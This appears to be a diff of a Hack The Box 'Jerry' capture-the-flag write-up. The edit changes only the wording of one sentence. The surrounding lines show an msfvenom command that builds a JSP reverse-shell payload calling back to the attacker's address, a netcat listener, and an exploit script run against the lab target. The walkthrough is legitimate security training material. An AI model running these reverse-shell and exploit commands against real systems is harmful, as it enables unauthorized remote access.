@@ -54,7 +54,7 @@ Nevertheless, I will quickly go over what I did to generate a `.jsp` shell paylo
 - Created a payload with `msfvenom --f jsp -p windows/shell_reverse_tcp lhost=10.10.14.13 lport=9001 -o shell.jsp`
 - Started a [[netcat]] listener and tried running the exploit with `python2 42966.py -u http://10.10.10.95:8080 -p shell.jsp`
 
-I changed my syntax, just providing the name `shell`. However, running it again with these options just gave me a 404 `resource is not available` error:
+Now I knew this wasn't necessary, I changed my syntax, just providing the name `shell`. However, running it again with these options just gave me a 404 `resource is not available` error:
 
 ```bash
 ┌──(mac㉿kali)-[~/Documents/HTB/jerry]
